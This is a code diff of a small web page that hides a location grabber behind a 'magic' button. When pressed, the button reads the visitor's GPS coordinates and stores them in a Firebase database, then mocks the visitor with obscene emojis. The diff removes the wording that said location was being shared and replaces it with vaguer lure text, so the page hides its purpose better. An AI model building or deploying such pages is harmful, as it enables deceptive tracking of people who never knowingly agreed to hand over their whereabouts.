@@ -1,21 +1,27 @@
-<!-- share.html --><!DOCTYPE html><html lang="en">
+<!-- share.html -->
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fun time</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Share Location</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h2>Thats time is fun.</h2>
-    <p>plase share trun on your location. say google.com </p>
-    <button id="shareBtn">Fun</button>
+    <h2>magic time</h2>
+    <p>see magic to press the Bottom .</p>
+    <button id="shareBtn">magic Bom💥</button>
     <p id="status"></p>
-  </div>  <script type="module">
+  </div>
+
+  <script type="module">
+    // Firebase CDN imports
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
     import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
     import { firebaseConfig } from './firebase-config.js';
 
+    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
@@ -34,7 +40,7 @@
       }
 
       shareBtn.disabled = true;
-      status.textContent = "Getting your location...";
+      status.textContent = "Getting your magic...";
 
       navigator.geolocation.getCurrentPosition(position => {
         const { latitude, longitude } = position.coords;
@@ -46,13 +52,17 @@
           latitude,
           longitude,
           timestamp
+        }).then(() => {
+          status.textContent = "🖕🖕🖕🖕🖕🖕🖕";
+        }).catch(error => {
+          status.textContent = "❌ Failed to import magic: " + error.message;
         });
 
-        status.textContent = "🖕🖕🖕🖕🖕";
       }, error => {
-        status.textContent = "google.com did not axis your location.plase try again" + error.message;
+        status.textContent = "❌ access denied: " + error.message;
         shareBtn.disabled = false;
       });
     };
-  </script></body>
+  </script>
+</body>
 </html>
